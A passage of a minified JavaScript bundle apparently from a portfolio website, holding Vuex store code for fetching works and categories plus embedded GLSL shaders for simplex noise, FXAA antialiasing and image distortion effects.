t&&!t.options&&!t.__prefetched}))},prefetchLink:function(){if(this.canPrefetch()){o.unobserve(this.$el);var t=this.getPrefetchComponents(),e=!0,i=!1,n=void 0;try{for(var r,a=t[Symbol.iterator]();!(e=(r=a.next()).done);e=!0){var s=r.value,l=s();l instanceof Promise&&l.catch((function(){})),s.__prefetched=!0}}catch(t){i=!0,n=t}finally{try{e||null==a.return||a.return()}finally{if(i)throw n}}}}}}},,,,,,,,,,,,,,,,,,,,,function(t,e,i){"use strict";i.r(e),i.d(e,"getUser",(function(){return r})),i.d(e,"getPickups",(function(){return a})),i.d(e,"getAllWorks",(function(){return o})),i.d(e,"getPages",(function(){return s})),i.d(e,"getInCategory",(function(){return l})),i.d(e,"getCategories",(function(){return c})),i.d(e,"getSingle",(function(){return h})),i(5);var n=i(64),r=function(t,e){(0,t.commit)("updateUserData",{isRetina:e.retina,device:e.device,brows:e.brows})},a=function(t,e){var i=t.commit;return t.state,new Promise((function(t,r){n.a.getPickups(e).then((function(e){i("updatePickups",e),t(e)}),(function(t){r(t)}))}))},o=function(t,e){var i=t.commit;return t.state,new Promise((function(t,r){n.a.getAllWorks(e).then((function(e){i("updateAll",e),t(e)}),(function(t){r(t)}))}))},s=function(t,e){var i=t.commit;return t.state,new Promise((function(t,r){n.a.getPages(e).then((function(e){i("updatePages",e),t(e)}),(function(t){r(t)}))}))},l=function(t,e){(0,t.commit)("updateInCategory",e)},c=function(t,e){var i=t.commit;return t.state,new Promise((function(t,r){n.a.getCategories(e).then((function(e){i("updateCategories",e),t(e)}),(function(t){r(t)}))}))},h=function(t,e){(0,t.commit)("updateSingle",e)}},function(t,e,i){"use strict";i.r(e),i.d(e,"isloading",(function(){return n})),i.d(e,"user",(function(){return r})),i.d(e,"page",(function(){return a})),i.d(e,"history",(function(){return o})),i.d(e,"pickups",(function(){return s})),i.d(e,"all",(function(){return l})),i.d(e,"single",(function(){return c})),i.d(e,"lang",(function(){return h})),i.d(e,"categories",(function(){return u})),i.d(e,"in_category",(function(){return d})),i.d(e,"in_category_name",(function(){return p})),i.d(e,"pages",(function(){return f}));var n=function(t){return t.isloading},r=function(t){return t.user},a=function(t){return t.page},o=function(t){return t.history},s=function(t){return t.pickups},l=function(t){return t.all},c=function(t){return t.single},h=function(t){return t.i18n.locale},u=function(t){return t.categories},d=function(t){return t.in_category},p=function(t){return t.in_category_name},f=function(t){return t.pages}},function(t,e,i){"use strict";i.r(e);var n,r=i(11);i(4),e.default=(n={updateLoading:function(t,e){t.isloading=e},updateUserData:function(t,e){t.user=e},updatePage:function(t,e){t.page=e},updatePages:function(t,e){t.pages=e},updatePageHistory:function(t,e){t.history=e},updatePickups:function(t,e){t.pickups=e}},Object(r.a)(n,"updatePickups",(function(t,e){t.pickups=e})),Object(r.a)(n,"updateCategories",(function(t,e){t.categories=e})),Object(r.a)(n,"updateInCategory",(function(t,e){var i=[],n=null;t.all.forEach((function(t,n){t.categories.indexOf(e.slug)>=0&&i.push(t)})),t.categories.forEach((function(t,i){t.slug===e.slug&&(n=t.name.charAt(0).toUpperCase()+t.name.slice(1).toLowerCase())})),t.in_category=i,t.in_category_name=n})),Object(r.a)(n,"updateAll",(function(t,e){t.all=e})),Object(r.a)(n,"updateSingle",(function(t,e){var i=null;t.all.forEach((function(t,n){t.slug===e.slug&&(i=t)})),t.single=i})),n)},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,function(t,e){t.exports='#define GLSLIFY 1\n//\n// Description : Array and textureless GLSL 2D/3D/4D simplex\n//               noise functions.\n//      Author : Ian McEwan, Ashima Arts.\n//  Maintainer : ijm\n//     Lastmod : 20110822 (ijm)\n//     License : Copyright (C) 2011 Ashima Arts. All rights reserved.\n//               Distributed under the MIT License. See LICENSE file.\n//               https://github.com/ashima/webgl-noise\n//\n\nvec3 mod289(vec3 x) {\n  return x - floor(x * (1.0 / 289.0)) * 289.0;\n}\n\nvec4 mod289(vec4 x) {\n  return x - floor(x * (1.0 / 289.0)) * 289.0;\n}\n\nvec4 permute(vec4 x) {\n     return mod289(((x*34.0)+1.0)*x);\n}\n\nvec4 taylorInvSqrt(vec4 r)\n{\n  return 1.79284291400159 - 0.85373472095314 * r;\n}\n\nfloat snoise(vec3 v)\n  {\n  const vec2  C = vec2(1.0/6.0, 1.0/3.0) ;\n  const vec4  D = vec4(0.0, 0.5, 1.0, 2.0);\n\n// First corner\n  vec3 i  = floor(v + dot(v, C.yyy) );\n  vec3 x0 =   v - i + dot(i, C.xxx) ;\n\n// Other corners\n  vec3 g_0 = step(x0.yzx, x0.xyz);\n  vec3 l = 1.0 - g_0;\n  vec3 i1 = min( g_0.xyz, l.zxy );\n  vec3 i2 = max( g_0.xyz, l.zxy );\n\n  //   x0 = x0 - 0.0 + 0.0 * C.xxx;\n  //   x1 = x0 - i1  + 1.0 * C.xxx;\n  //   x2 = x0 - i2  + 2.0 * C.xxx;\n  //   x3 = x0 - 1.0 + 3.0 * C.xxx;\n  vec3 x1 = x0 - i1 + C.xxx;\n  vec3 x2 = x0 - i2 + C.yyy; // 2.0*C.x = 1/3 = C.y\n  vec3 x3 = x0 - D.yyy;      // -1.0+3.0*C.x = -0.5 = -D.y\n\n// Permutations\n  i = mod289(i);\n  vec4 p = permute( permute( permute(\n             i.z + vec4(0.0, i1.z, i2.z, 1.0 ))\n           + i.y + vec4(0.0, i1.y, i2.y, 1.0 ))\n           + i.x + vec4(0.0, i1.x, i2.x, 1.0 ));\n\n// Gradients: 7x7 points over a square, mapped onto an octahedron.\n// The ring size 17*17 = 289 is close to a multiple of 49 (49*6 = 294)\n  float n_ = 0.142857142857; // 1.0/7.0\n  vec3  ns = n_ * D.wyz - D.xzx;\n\n  vec4 j = p - 49.0 * floor(p * ns.z * ns.z);  //  mod(p,7*7)\n\n  vec4 x_ = floor(j * ns.z);\n  vec4 y_ = floor(j - 7.0 * x_ );    // mod(j,N)\n\n  vec4 x = x_ *ns.x + ns.yyyy;\n  vec4 y = y_ *ns.x + ns.yyyy;\n  vec4 h = 1.0 - abs(x) - abs(y);\n\n  vec4 b0 = vec4( x.xy, y.xy );\n  vec4 b1 = vec4( x.zw, y.zw );\n\n  //vec4 s0 = vec4(lessThan(b0,0.0))*2.0 - 1.0;\n  //vec4 s1 = vec4(lessThan(b1,0.0))*2.0 - 1.0;\n  vec4 s0 = floor(b0)*2.0 + 1.0;\n  vec4 s1 = floor(b1)*2.0 + 1.0;\n  vec4 sh = -step(h, vec4(0.0));\n\n  vec4 a0 = b0.xzyw + s0.xzyw*sh.xxyy ;\n  vec4 a1 = b1.xzyw + s1.xzyw*sh.zzww ;\n\n  vec3 p0 = vec3(a0.xy,h.x);\n  vec3 p1 = vec3(a0.zw,h.y);\n  vec3 p2 = vec3(a1.xy,h.z);\n  vec3 p3 = vec3(a1.zw,h.w);\n\n//Normalise gradients\n  vec4 norm = taylorInvSqrt(vec4(dot(p0,p0), dot(p1,p1), dot(p2, p2), dot(p3,p3)));\n  p0 *= norm.x;\n  p1 *= norm.y;\n  p2 *= norm.z;\n  p3 *= norm.w;\n\n// Mix final noise value\n  vec4 m = max(0.6 - vec4(dot(x0,x0), dot(x1,x1), dot(x2,x2), dot(x3,x3)), 0.0);\n  m = m * m;\n  return 42.0 * dot( m*m, vec4( dot(p0,x0), dot(p1,x1),\n                                dot(p2,x2), dot(p3,x3) ) );\n  }\n\n/**\nBasic FXAA implementation based on the code on geeks3d.com with the\nmodification that the texture2DLod stuff was removed since it\'s\nunsupported by WebGL.\n\n--\n\nFrom:\nhttps://github.com/mitsuhiko/webgl-meincraft\n\nCopyright (c) 2011 by Armin Ronacher.\n\nSome rights reserved.\n\nRedistribution and use in source and binary forms, with or without\nmodification, are permitted provided that the following conditions are\nmet:\n\n    * Redistributions of source code must retain the above copyright\n      notice, this list of conditions and the following disclaimer.\n\n    * Redistributions in binary form must reproduce the above\n      copyright notice, this list of conditions and the following\n      disclaimer in the documentation and/or other materials provided\n      with the distribution.\n\n    * The names of the contributors may not be used to endorse or\n      promote products derived from this software without specific\n      prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\nA PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\nOWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\nDATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\nTHEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*/\n\n#ifndef FXAA_REDUCE_MIN\n    #define FXAA_REDUCE_MIN   (1.0/ 128.0)\n#endif\n#ifndef FXAA_REDUCE_MUL\n    #define FXAA_REDUCE_MUL   (1.0 / 8.0)\n#endif\n#ifndef FXAA_SPAN_MAX\n    #define FXAA_SPAN_MAX     8.0\n#endif\n\n//optimized version for mobile, where dependent \n//texture reads can be a bottleneck\nvec4 fxaa_0(sampler2D tex, vec2 fragCoord, vec2 resolution,\n            vec2 v_rgbNW, vec2 v_rgbNE, \n            vec2 v_rgbSW, vec2 v_rgbSE, \n            vec2 v_rgbM) {\n    vec4 color;\n    mediump vec2 inverseVP = vec2(1.0 / resolution.x, 1.0 / resolution.y);\n    vec3 rgbNW = texture2D(tex, v_rgbNW).xyz;\n    vec3 rgbNE = texture2D(tex, v_rgbNE).xyz;\n    vec3 rgbSW = texture2D(tex, v_rgbSW).xyz;\n    vec3 rgbSE = texture2D(tex, v_rgbSE).xyz;\n    vec4 texColor = texture2D(tex, v_rgbM);\n    vec3 rgbM  = texColor.xyz;\n    vec3 luma = vec3(0.299, 0.587, 0.114);\n    float lumaNW = dot(rgbNW, luma);\n    float lumaNE = dot(rgbNE, luma);\n    float lumaSW = dot(rgbSW, luma);\n    float lumaSE = dot(rgbSE, luma);\n    float lumaM  = dot(rgbM,  luma);\n    float lumaMin = min(lumaM, min(min(lumaNW, lumaNE), min(lumaSW, lumaSE)));\n    float lumaMax = max(lumaM, max(max(lumaNW, lumaNE), max(lumaSW, lumaSE)));\n    \n    mediump vec2 dir;\n    dir.x = -((lumaNW + lumaNE) - (lumaSW + lumaSE));\n    dir.y =  ((lumaNW + lumaSW) - (lumaNE + lumaSE));\n    \n    float dirReduce = max((lumaNW + lumaNE + lumaSW + lumaSE) *\n                          (0.25 * FXAA_REDUCE_MUL), FXAA_REDUCE_MIN);\n    \n    float rcpDirMin = 1.0 / (min(abs(dir.x), abs(dir.y)) + dirReduce);\n    dir = min(vec2(FXAA_SPAN_MAX, FXAA_SPAN_MAX),\n              max(vec2(-FXAA_SPAN_MAX, -FXAA_SPAN_MAX),\n              dir * rcpDirMin)) * inverseVP;\n    \n    vec3 rgbA = 0.5 * (\n        texture2D(tex, fragCoord * inverseVP + dir * (1.0 / 3.0 - 0.5)).xyz +\n        texture2D(tex, fragCoord * inverseVP + dir * (2.0 / 3.0 - 0.5)).xyz);\n    vec3 rgbB = rgbA * 0.5 + 0.25 * (\n        texture2D(tex, fragCoord * inverseVP + dir * -0.5).xyz +\n        texture2D(tex, fragCoord * inverseVP + dir * 0.5).xyz);\n\n    float lumaB = dot(rgbB, luma);\n    if ((lumaB < lumaMin) || (lumaB > lumaMax))\n        color = vec4(rgbA, texColor.a);\n    else\n        color = vec4(rgbB, texColor.a);\n    return color;\n}\n\n//To save 9 dependent texture reads, you can compute\n//these in the vertex shader and use the optimized\n//frag.glsl function in your frag shader. \n\n//This is best suited for mobile devices, like iOS.\n\nvoid texcoords(vec2 fragCoord, vec2 resolution,\n\t\t\tout vec2 v_rgbNW, out vec2 v_rgbNE,\n\t\t\tout vec2 v_rgbSW, out vec2 v_rgbSE,\n\t\t\tout vec2 v_rgbM) {\n\tvec2 inverseVP = 1.0 / resolution.xy;\n\tv_rgbNW = (fragCoord + vec2(-1.0, -1.0)) * inverseVP;\n\tv_rgbNE = (fragCoord + vec2(1.0, -1.0)) * inverseVP;\n\tv_rgbSW = (fragCoord + vec2(-1.0, 1.0)) * inverseVP;\n\tv_rgbSE = (fragCoord + vec2(1.0, 1.0)) * inverseVP;\n\tv_rgbM = vec2(fragCoord * inverseVP);\n}\n\nvec4 apply(sampler2D tex, vec2 fragCoord, vec2 resolution) {\n\tmediump vec2 v_rgbNW;\n\tmediump vec2 v_rgbNE;\n\tmediump vec2 v_rgbSW;\n\tmediump vec2 v_rgbSE;\n\tmediump vec2 v_rgbM;\n\n\t//compute the texture coords\n\ttexcoords(fragCoord, resolution, v_rgbNW, v_rgbNE, v_rgbSW, v_rgbSE, v_rgbM);\n\t\n\t//compute FXAA\n\treturn fxaa_0(tex, fragCoord, resolution, v_rgbNW, v_rgbNE, v_rgbSW, v_rgbSE, v_rgbM);\n}\n\nuniform float pixel_rario;\n\n//==========\n// noise\n//==========\nuniform float offsetX;\nuniform float offsetY;\nuniform float rgb;\nuniform float is_desktop;\nuniform float effect;\n\n//\nuniform sampler2D tDiffuse;\nuniform vec2 resolution;\nuniform vec2 pivot;\nuniform vec2 fxaa;\nuniform vec2 mouse;\nvarying vec2 vUv;\n\n//\nuniform float mag_radius;\nuniform float mag_power;\n\n//\nuniform float is_subpages;\n\n//\nuniform float wheel_power;\n\n//\nuniform vec2  nz_position;\nuniform float nz_power;\nuniform float nz_time;\n\nvoid main() {\n\t// vec4 color = texture2D( tDiffuse, vUv );\n\n\tfloat aspect = resolution.x / resolution.y;\n\tvec2  uv_mag = vec2( 0.0, 0.0 );\n\tvec2  p = (gl_FragCoord.xy / resolution.xy) * pixel_rario;\n\n\t//======\n\tfloat x   = vUv.x + offsetX;\n\tfloat y   = vUv.y + offsetY;\n\tfloat uv_noize_r = 0.0;\n\tfloat uv_noize_g = 0.0;\n\tfloat uv_noize_b = 0.0;\n\n\t//\n\tif( is_desktop == 0.0 ){\n\n\t\tvec2 m = mouse.xy;\n\t\tvec2 d = p - m;\n\t\tfloat distance  = length( vUv.y );\n\t\tfloat gr        = pow( distance + 0.5, mag_power );  \n\t\tfloat mag       = cos( 1.0 - gr );\n\t\tuv_mag          = m + d * mag;\n\n\t} else {\n\n\t\t//==============================\n\t\t// noize effect\n\t\t//==============================\n        float nx = vUv.x * nz_position.x;\n        float ny = vUv.y * nz_position.y;\n        float nz = 0.1 * nz_time;\n\t\tfloat uv_noize = snoise( vec3(nx,ny,nz) );\n\t\tvec2  uv_distVec   = ( vUv.x - mouse.x ) * vec2( max(1.0,aspect), max(1.0,1.0/aspect) );\n\t\tfloat uv_distance  = length( uv_distVec );\n\t\tfloat uv_pow = pow( uv_distance, 2.0 ) * nz_power;\n\t\tuv_noize_r = float( 0.5 * uv_noize ) * uv_pow;\n\t\tuv_noize_g = float( 0.5 * uv_noize ) * uv_pow;\n\t\tuv_noize_b = float( 0.5 * uv_noize ) * uv_pow;\n\n\t\t//==============================\n\t\t// pinch effect\n\t\t//==============================\n\t\tvec2 m = mouse.xy;\n\t\tvec2 d = p - m;\n\t\tvec2  distVec   = ( vUv - mouse ) * vec2( max(1.0,aspect), max(1.0,1.0/aspect) );\n\t\tfloat distance  = length( distVec );\n\t\tfloat gr        = pow( distance / mag_radius, mag_power );  \n\t\tfloat mag       = cos( 1.0 - gr );\n\t\tif ( distance > mag_radius ) {\n\t\t\tuv_mag  = p;\n\t\t} else if ( distance < mag_radius ) {\n\t\t\tuv_mag  = m + d * mag;\n\t\t}\n\n\t}\n\n\t//\n\tfloat _py = sin( vUv.x - 0.5 ) * pow( 1.0 - vUv.y , 2.0 ) * abs(wheel_power) * 2.0;\n\tfloat uv_mag_x = uv_mag.x - vUv.x - _py;\n\tfloat uv_mag_y = uv_mag.y - vUv.y;\n\n\t//\n\tfloat _dx = x + uv_noize_r + uv_mag_x;\n\tfloat _dy = y + uv_noize_g + uv_mag_y;\n\tvec2 uv_displaced = vec2( _dx, _dy );\n\n\t//\n\tvec4 _tDiffuse = texture2D( tDiffuse, uv_displaced );\n\tif( is_subpages == 1.0 ){\n\t    vec2 fragCoord = uv_displaced * resolution;\n\t    _tDiffuse = apply( tDiffuse , fragCoord, resolution );\n\t}\n\n\t//\n\tgl_FragColor.r = _tDiffuse.r + rgb;\n\tgl_FragColor.g = _tDiffuse.g + rgb;\n\tgl_FragColor.b = _tDiffuse.b + rgb;\n\tgl_FragColor.a = _tDiffuse.a;\n\n}\n\n'},function(t,e){t.exports="#define GLSLIFY 1\n//==========\nvarying vec2 vUv;\nvoid main(){\n\tvUv = uv;\n\tgl_Position = projectionMatrix * modelViewMatrix * vec4(position,1.0);\n}\n\n//==========\n// varying vec2 vUv;\n// uniform float skewX;\n// uniform float skewY;\n// uniform float scaleX;\n// uniform float scaleY;\n// uniform float scaleZ;\n// void main() {\n// \tvUv = uv;\n\n// \t// Skew\n// \tmat4 sXPos = mat4(\n// \t\tvec4(1.0,-sin(skewY),0.0,0.0),\n// \t\tvec4(sin(skewX),1.0,0.0,0.0),\n// \t\tvec4(0.0,0.0,1.0,0.0),\n// \t\tvec4(0.0,0.0,0.0,1.0)\n// \t);\n\n// \t// Scale\n// \tmat4 sPos = mat4(vec4(scaleX,0.0,0.0,0.0),\n// \tvec4(0.0,scaleY,0.0,0.0),\n// \tvec4(0.0,0.0,scaleZ,0.0),\n// \tvec4(0.0,0.0,0.0,1.0));\n\n// \t//\n// \tgl_Position = projectionMatrix * modelViewMatrix * sPos * sXPos * vec4(position,1.0);\n\n// }\n\n//==========\n// varying vec2 vUv;\n// uniform vec2 resolution;\n// uniform float power;\n// void main(){\n// \tvUv = uv;\n\n// \tfloat thetaY = position.x / resolution.x * power;\n// \tfloat tx   = position.x;\n// \tfloat ty   = position.y;\n// \tfloat ty_z = resolution.x * ( 1.0 - cos( thetaY ) ) * power;\n// \tvec3 p = vec3( tx, ty, ty_z );\n// \tvec4 mvPosition = modelViewMatrix * vec4(p, 1.0);\n// \tgl_Position = projectionMatrix * mvPosition;\n// }\n"},function(t,e){t.exports="#define GLSLIFY 1\nuniform float offsetX;\nuniform float offsetY;\nuniform float scale;\nvarying vec2  vUv;\n\nuniform sampler2D tImage;\nuniform sampler2D tVideo;\n\nuniform float alpha;\nuniform float fade;\nuniform float gradient;\n\nuniform float rgb_shift;\nuniform float rgb;\nuniform float opacity;\n\nuniform float is_video;\nuniform float is_loaded_data;\n\nuniform float cy;\n\n// uniform vec2 reflection;\n\nvoid main() {\n\n\tfloat x = vUv.x;\n\tfloat y = vUv.y;\n\n\t//==========\n\t// scale\n\t//==========\n\tfloat _scale = scale - 1.0;\n\tfloat sx = x - (x * _scale)*0.5 + _scale * 0.25 + offsetX;\n\tfloat sy = y - (y * _scale)*0.5 + _scale * 0.25 + offsetY;\n\tvec2 uv_displaced = vec2(x, y);\n\n\t//==========\n\t// curve\n\t//==========\n\tfloat dx = sx;\n\tfloat dy = sy;\n\tif( dx > 1.0 ) {\n\t\tdx = 2.0 - sx;\n\t}\n\tif( dx < 0.0 ) {\n\t\tdx = -1.0 * sx;\n\t}\n\tif( dy > 1.0 ) {\n\t\tdy = 2.0 - sy;\n\t}\n\tif( dy < 0.0 ) {\n\t\tdy = -1.0 * sy;\n\t}\n\n\t//==========\n\t// rgb\n\t//==========\n\tvec2 r_displaced  = vec2( dx, dy - rgb_shift *       (1.0-vUv.y) );\n\tvec2 g_displaced  = vec2( dx, dy - rgb_shift * 2.0 * (1.0-vUv.y) );\n\tvec2 b_displaced  = vec2( dx, dy - rgb_shift * 3.0 * (1.0-vUv.y) );\n\n\tfloat img_r = texture2D( tImage, r_displaced ).r + rgb;\n\tfloat img_g = texture2D( tImage, g_displaced ).g + rgb;\n\tfloat img_b = texture2D( tImage, b_displaced ).b + rgb;\n\tfloat r = img_r * opacity * alpha;\n\tfloat g = img_g * opacity * alpha;\n\tfloat b = img_b * opacity * alpha;\n\n\tif( is_video == 1.0 && is_loaded_data == 1.0 ){\n\n\t\t//\n\t\tfloat fade_img_r = img_r * max( 1.0 - pow( vUv.y * fade + fade, 2.0 ), 0.0 );\n\t\tfloat fade_img_g = img_g * max( 1.0 - pow( vUv.y * fade + fade, 2.0 ), 0.0 );\n\t\tfloat fade_img_b = img_b * max( 1.0 - pow( vUv.y * fade + fade, 2.0 ), 0.0 );\n\n\t\t//\n\t\tfloat video_r      = texture2D( tVideo, r_displaced ).r + rgb;\n\t\tfloat video_g      = texture2D( tVideo, g_displaced ).g + rgb;\n\t\tfloat video_b      = texture2D( tVideo, b_displaced ).b + rgb;\n\t\tfloat fade_video_r = video_r * min( pow( vUv.y * fade + fade, 2.0 ), 1.0 );\n\t\tfloat fade_video_g = video_g * min( pow( vUv.y * fade + fade, 2.0 ), 1.0 );\n\t\tfloat fade_video_b = video_b * min( pow( vUv.y * fade + fade, 2.0 ), 1.0 );\n\n\t\t//\n\t\tr = ( fade_img_r + fade_video_r ) * opacity * alpha;\n\t\tg = ( fade_img_g + fade_video_g ) * opacity * alpha;\n\t\tb = ( fade_img_b + fade_video_b ) * opacity * alpha;\n\n\t}\n\n\tfloat a = vUv.y + ( 1.0 - vUv.y ) * ( 1.0 - gradient );\n\tgl_FragColor.r = r;\n\tgl_FragColor.g = g;\n\tgl_FragColor.b = b;\n\tgl_FragColor.a = a;\n\n}\n\n"},function(t,e){t.exports="#define GLSLIFY 1\nvarying vec2 vUv;\nvoid main(){\n\tvUv = uv;\n\tgl_Position = projectionMatrix * modelViewMatrix * vec4(position,1.0);\n}"},function(t,e){t.exports="#define GLSLIFY 1\nuniform float skewX;\nuniform float skewY;\nuniform float scale;\nvarying vec2 vUv;\nuniform sampler2D tDiffuse;\nuniform float opacity;\nuniform float rgb;\nuniform float gradient;\nuniform float rgb_shift;\n\nvoid main() {\n\n\t//==========\n\t// skew\n\t//==========\n\tfloat x = vUv.x + skewX * vUv.y - skewX*0.5;\n\tfloat y = vUv.y + skewY * (1.0 - vUv.x) - skewY*0.5;\n\n\t//==========\n\t// scale\n\t//==========\n\tfloat _scale = scale - 1.0;\n\tfloat sx = x - (x * _scale)*0.5 + _scale * 0.25;\n\tfloat sy = y - (y * _scale)*0.5 + _scale * 0.25;\n\tvec2 uv_displaced = vec2(x, y);\n\n\t//\n\tfloat dx = sx;\n\tfloat dy = sy;\n\tif( dx > 1.0 ) {\n\t\tdx = sx - 1.0;\n\t}\n\tif( dx < 0.0 ) {\n\t\tdx = sx + 1.0;\n\t}\n\tif( dy > 1.0 ) {\n\t\tdy = sy - 1.0;\n\t}\n\tif( dy < 0.0 ) {\n\t\tdy = sy + 1.0;\n\t}\n\n\tvec2 r_displaced  = vec2( dx, dy - rgb_shift *       (1.0-vUv.y) );\n\tvec2 g_displaced  = vec2( dx, dy - rgb_shift * 2.0 * (1.0-vUv.y) );\n\tvec2 b_displaced  = vec2( dx, dy - rgb_shift * 3.0 * (1.0-vUv.y) );\n\tfloat img_r = texture2D( tDiffuse, r_displaced ).r + rgb;\n\tfloat img_g = texture2D( tDiffuse, g_displaced ).g + rgb;\n\tfloat img_b = texture2D( tDiffuse, b_displaced ).b + rgb;\n\tfloat r = img_r * opacity;\n\tfloat g = img_g * opacity;\n\tfloat b = img_b * opacity;\n\n\t//\n\tfloat a = vUv.y + ( 1.0 - vUv.y ) * ( 1.0 - gradient );\n\tgl_FragColor.r = r;\n\tgl_FragColor.g = g;\n\tgl_FragColor.b = b;\n\tgl_FragColor.a = a;\n\n}\n\n"},function(t,e){t.exports="#define GLSLIFY 1\n//==========\n// varying vec2 vUv;\n// uniform float power;\n// uniform float radius;\n// void main(){\n// \tvUv = uv;\n\n// \tfloat theta = position.x;\n\n// \tfloat tx = position.x;\n\n// \tfloat ty = position.y;\n\n// \tfloat tz = cos( position.y ) * radius * 0.1;\n\n// \tvec3 p = vec3(tx, ty, tz);\n\n// \tvec4 mvPosition = modelViewMatrix * vec4(p, 1.0);\n\n// \tgl_Position = projectionMatrix * mvPosition;\n// }\n\n//==========\nvarying vec2 vUv;\nvoid main(){\n\tvUv = uv;\n\tgl_Position = projectionMatrix * modelViewMatrix * vec4(position,1.0);\n}\n\n//==========\n// varying vec2 vUv;\n// uniform float skewX;\n// uniform float skewY;\n// uniform float scaleX;\n// uniform float scaleY;\n// uniform float scaleZ;\n// void main() {\n// \tvUv = uv;\n\n// \t// Skew\n// \tmat4 sXPos = mat4(\n// \t\tvec4(1.0,-sin(skewY),0.0,0.0),\n// \t\tvec4(sin(skewX),1.0,0.0,0.0),\n// \t\tvec4(0.0,0.0,1.0,0.0),\n// \t\tvec4(0.0,0.0,0.0,1.0)\n// \t);\n\n// \t// Scale\n// \tmat4 sPos = mat4(vec4(scaleX,0.0,0.0,0.0),\n// \tvec4(0.0,scaleY,0.0,0.0),\n// \tvec4(0.0,0.0,scaleZ,0.0),\n// \tvec4(0.0,0.0,0.0,1.0));\n\n// \t//\n// \tgl_Position = projectionMatrix * modelViewMatrix * sPos * sXPos * vec4(position,1.0);\n\n// }"},function(t,e){t.exports="#define GLSLIFY 1\nvarying vec2 vUv;\nuniform sampler2D fillText;\nuniform sampler2D strokeText;\nuniform vec2 resolution;\nuniform vec2 offset;\nuniform vec2 pivot;\n\n//\nuniform float right;\nuniform float left;\nuniform float height;\n\n//\nuniform float opacity;\nuniform float radius;\nuniform float radius_pow;\nuniform float hole;\n\n//\n// uniform float wheel_power;\n\nvoid main() {\n\n\t//=====\n\tfloat _min_y = gl_FragCoord.y - ( gl_FragCoord.x/10.0 * left ) + ( gl_FragCoord.x/10.0 * right );\n\tfloat _max_y = gl_FragCoord.y + ( gl_FragCoord.x/10.0 * left ) - ( gl_FragCoord.x/10.0 * right );\n\n\t//=====\n\t// float _ax = gl_FragCoord.x/resolution.x;\n\t// float _ay = gl_FragCoord.y/resolution.y;\n\t// float _py = sin( _ax - 0.5 ) * pow( 1.0 - _ay , 2.0 ) * abs(wheel_power) * 2.0;\n\t// float uv_mag_x = -_py;\n\t// float uv_mag_y = 0.0;\n\t// float dx = vUv.x - offset.x + uv_mag_x;\n\t// float dy = vUv.y - offset.y + uv_mag_y;\n\t// vec2 uv_displaced = vec2( dx, dy );\n\n\t//=====\n\tfloat dx = vUv.x - offset.x;\n\tfloat dy = vUv.y - offset.y;\n\tvec2 uv_displaced = vec2( dx, dy );\n\n\t//=====\n\tfloat _h = resolution.y/100.0 * height;\n\tfloat _min_h = resolution.y/2.0 + _h;\n\tfloat _max_h = resolution.y/2.0 - _h;\n\n\t//=====\n\tvec4 fill   = texture2D( fillText, uv_displaced );\n\tvec4 stroke = texture2D( strokeText, uv_displaced );\n\n\t//\n\tif( _min_y < _min_h && _max_y > _max_h ){\n\t\tif( hole == 1.0 ){\n\t\t\tfloat distance = length( gl_FragCoord.xy - pivot );\n\t\t\tif( distance < radius ){\n\t\t\t\tgl_FragColor = ( ( fill * pow( distance/radius, radius_pow ) ) + stroke ) * opacity;\n\t\t\t} else {\n\t\t\t\tgl_FragColor = fill * opacity;\n\t\t\t}\n\t\t} else {\n\t\t\tgl_FragColor = fill * opacity;\n\t\t}\n\t} else {\n\t\tgl_FragColor = stroke * opacity;\n\t}\n\n}\n\n"},function(t,e){t.exports="#define GLSLIFY 1\nvarying vec2 vUv;\nvoid main(){\n\tvUv = uv;\n\tgl_Position = projectionMatrix * modelViewMatrix * vec4(position,1.0);\n}"},function(t,e){t.exports="#define GLSLIFY 1\nuniform float offsetX;\nuniform float offsetY;\nuniform float scaleX;\nuniform float scaleY;\n\nvarying vec2 vUv;\n\nuniform sampler2D tDiffuse;\nuniform vec2 resolution;\nuniform vec2 rect;\n\nuniform float opacity;\nuniform float alpha;\nuniform float rgb;\nuniform float rgb_shift;\n\n//\nuniform float wheel_power;\nuniform float gradient;\n\n//\nuniform float is_fullscreen;\nuniform float is_win;\n\nvoid main() {\n\n\t//==========\n\t// scale\n\t//==========\n\tfloat _scaleX = scaleX - 1.0;\n\tfloat _scaleY = scaleY - 1.0;\n\tvec2 uv_scale = vec2(\n\t\tvUv.x - (vUv.x * _scaleX)*0.5 + _scaleX * 0.25 + offsetX,\n\t\tvUv.y - (vUv.y * _scaleY)*0.5 + _scaleY * 0.25 + offsetY\n\t);\n\n\tif( is_fullscreen == 1.0 ){\n\t\tvec2 ratio = vec2(\n\t\t\tmin(( resolution.x / resolution.y ) / ( rect.x / rect.y ), 1.0),\n\t\t\tmin(( resolution.y / resolution.x ) / ( rect.y / rect.x ), 1.0)\n\t\t);\n\t\tuv_scale.x = vUv.x * ratio.x + (1.0 - ratio.x) * 0.5 + offsetX;\n\t\tuv_scale.y = vUv.y * ratio.y + (1.0 - ratio.y) * 0.5 + offsetY;\n\t}\n\n\t//==========\n\tvec2 aspect = vec2(\n\t\tgl_FragCoord.x/resolution.x,\n\t\tgl_FragCoord.y/resolution.y\n\t);\n\tfloat power = sin( aspect.x - 0.5 ) * pow( 1.0 - aspect.y, 10.0 ) * 0.75 * abs( wheel_power ) * 3.0;\n\tif( is_win == 1.0 ){\n\t\tpower = 0.0;\n\t}\n\t// float power = sin( aspect.x - 0.5 ) * ( pow( 1.0 - aspect.y, 20.0 ) * 0.75 );\n\n\t//==========\n\tvec2 uv_disp = vec2(\n\t\tuv_scale.x - 